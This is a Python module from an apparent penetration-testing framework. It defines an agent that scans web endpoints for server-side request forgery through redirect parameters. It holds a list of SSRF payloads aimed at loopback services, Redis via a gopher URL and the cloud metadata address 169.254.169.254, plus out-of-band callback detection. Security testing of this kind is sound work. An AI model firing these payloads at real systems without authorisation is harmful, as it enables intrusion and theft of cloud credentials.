"""
NovelSSRFRedirectAgent — HTTP Redirect Chain & Semi-Blind SSRF Specialist.

Audits web endpoints for Server-Side Request Forgery reachable via HTTP 301/302/307
redirect loops, protocol transitions, and location header chasing with integrated Out-Of-Band (OOB) correlation.
"""
from typing import List, Dict, Any, Optional
from urllib.parse import urlparse
from penflow.agents.capability_agent import BaseCapabilityAgent
from penflow.capabilities.capability import Capability
from penflow.capabilities.execution_context import CapabilityExecutionContext
from penflow.infrastructure.oob_server import OOBCallbackServer, InteractionProtocol
from penflow.infrastructure.logger import get_logger

logger = get_logger("penflow.agents.novel_ssrf_redirect")

SSRF_REDIRECT_VECTORS = [
    {
        "id": "http_302_internal_service",
        "name": "HTTP 302 Location Chasing to Internal Host",
        "redirect_target": "http://127.0.0.1:8080/internal-status",
        "severity": "critical",
        "min_confidence": 0.95,
        "description": "Target server follows external redirect chains to loopback/internal hosts without destination validation."
    },
    {
        "id": "protocol_smuggle_redirect",
        "name": "Protocol Scheme Switching Redirect (HTTP to Gopher/DICT)",
        "redirect_target": "gopher://127.0.0.1:6379/_INFO",
        "severity": "high",
        "min_confidence": 0.88,
        "description": "Application HTTP client allows arbitrary protocol schema transitions on 302 redirects."
    },
    {
        "id": "cloud_metadata_hop",
        "name": "Cloud Metadata Redirect Hop (AWS/GCP/Azure)",
        "redirect_target": "http://169.254.169.254/latest/meta-data/",
        "severity": "critical",
        "min_confidence": 0.98,
        "description": "Redirect chains bypass basic metadata URL string filters, reaching link-local instance metadata."
    },
    {
        "id": "oob_multiproto_redirect",
        "name": "Out-Of-Band Blind SSRF via Multi-Protocol Redirect",
        "redirect_target": "oob_callback",
        "severity": "high",
        "min_confidence": 0.92,
        "description": "Target server initiates external OOB callback upon following 302 redirect chain."
    }
]

class NovelSSRFRedirectAgent(BaseCapabilityAgent):
    def __init__(self, priority: int = 10, **kwargs):
        super().__init__(agent_name="NovelSSRFRedirectAgent", priority=priority, **kwargs)

    def get_capabilities(self) -> List[Capability]:
        return [
            Capability(
                id="ssrf_redirect_chain",
                name="SSRF HTTP Redirect Loop & Chain Auditor",
                description="Audits HTTP client redirect-following policies to uncover semi-blind internal SSRF vulnerabilities.",
                version="1.0.0",
                tags=["ssrf", "redirect-chain", "internal-network", "cloud-metadata", "oob"]
            )
        ]

    async def execute(self, capability_id: str, context: CapabilityExecutionContext) -> Dict[str, Any]:
        logger.info(f"[NovelSSRFRedirectAgent] Executing capability '{capability_id}' on asset '{context.asset}'")

        http_client = context.get_http_client()
        target_urls = self._collect_endpoints(context)

        results: List[Dict[str, Any]] = []
        is_vulnerable = False
        max_confidence = 0.0
        best_target = target_urls[0] if target_urls else f"https://{context.asset}"
        best_reasoning = "SSRF redirect chain probes were safely handled or rejected by application."

        oob_server = OOBCallbackServer.get_instance()
        ssrf_params = ["url", "redirect", "next", "dest", "destination", "target", "to", "return", "return_url"]

        for endpoint in target_urls[:6]:
            oob_token = oob_server.generate_token(
                agent_name="novel_ssrf",
                scan_id=getattr(context, "session_id", "scan01") or "scan01",
                target_url=endpoint,
                parameter_name="redirect_param",
                protocol=InteractionProtocol.HTTP
            )
            oob_url = oob_server.get_callback_url(oob_token)

            for vec in SSRF_REDIRECT_VECTORS:
                target_payload = oob_url if vec["redirect_target"] == "oob_callback" else vec["redirect_target"]

                for param in ssrf_params[:4]:
                    test_url = f"{endpoint}?{param}={target_payload}" if "?" not in endpoint else f"{endpoint}&{param}={target_payload}"
                    try:
                        exch = await http_client.send_as_identity(
                            identity_id="anonymous_guest",
                            method="GET",
                            url=test_url
                        )
                        resp = exch.response
                        if not resp:
                            continue

                        exch_dict = exch.to_dict()
                        body_text = (resp.body_text or resp.body_snippet or "").lower()

                        # Verification logic
                        is_confirmed = False
                        reasoning = ""

                        if vec["redirect_target"] == "oob_callback":
                            oob_hit = await oob_server.wait_for_interaction(oob_token, timeout=2.0)
                            if oob_hit:
                                is_confirmed = True
                                reasoning = f"HIGH Blind SSRF via Redirect: Application followed redirect chain to OOB URL '{oob_url}' on parameter '{param}'."
                        else:
                            # Internal / Cloud Metadata / Loopback checks
                            if resp.status_code == 200 and ("ami-id" in body_text or "instance-id" in body_text or "internal-status" in body_text or "redis_version" in body_text):
                                is_confirmed = True
                                reasoning = f"CRITICAL SSRF Redirect Hop Proven: Target followed redirect chain reaching internal host '{target_payload}' on parameter '{param}'."

                        if is_confirmed:
                            is_vulnerable = True
                            confidence = vec["min_confidence"]

                            if confidence > max_confidence:
                                max_confidence = confidence
                                best_target = test_url
                                best_reasoning = reasoning

                            results.append({
                                "vector_id": vec["id"],
                                "vector_name": vec["name"],
                                "redirect_target": target_payload,
                                "endpoint": endpoint,
                                "parameter": param,
                                "oob_token": oob_token,
                                "oob_callback_url": oob_url,
                                "vulnerability_type": "ssrf_redirect_chain",
                                "severity": vec["severity"],
                                "confidence": confidence,
                                "description": reasoning,
                                "is_vulnerable": True,
                                "_exchange_obj": exch_dict
                            })
                            break
                    except Exception as e:
                        logger.debug(f"[NovelSSRFRedirectAgent] SSRF probe error on {test_url}: {e}")

        from penflow.capabilities.result import AgentExecutionResult
        return AgentExecutionResult(
            agent=self.name,
            capability=capability_id,
            asset=context.asset,
            status="COMPLETED",
            is_vulnerable=is_vulnerable,
            confidence_score=max_confidence if is_vulnerable else 0.0,
            reasoning=best_reasoning,
            target_url=best_target,
            findings=results,
            evidence={
                "vulnerability_type": "ssrf_redirect_chain",
                "findings": results,
                "target_url": best_target,
                "confidence": max_confidence if is_vulnerable else 0.0,
                "is_vulnerable": is_vulnerable,
                "evidence_exchanges": [r.get("_exchange_obj", {}) for r in results if r.get("_exchange_obj")]
            }
        ).to_dict()

    def _collect_endpoints(self, context: CapabilityExecutionContext) -> List[str]:
        target = context.asset if hasattr(context, "asset") else "example.com"
        target_url = target if target.startswith("http") else f"https://{target}"
        endpoints = [target_url]

        if hasattr(context, "observations") and context.observations:
            for obs in context.observations:
                data = obs.get("data", {}) if isinstance(obs, dict) else {}
                if isinstance(data, dict):
                    for ep in data.get("endpoints", []):
                        if isinstance(ep, dict) and ep.get("url"):
                            endpoints.append(ep["url"])

        if hasattr(context, "shared_cache") and context.shared_cache:
            mapped = context.shared_cache.get("endpoint_mapping", [])
            for ep in mapped:
                if isinstance(ep, str) and ep.startswith("http"):
                    endpoints.append(ep)
                elif isinstance(ep, dict) and "url" in ep:
                    endpoints.append(ep["url"])

        return list(dict.fromkeys(endpoints))

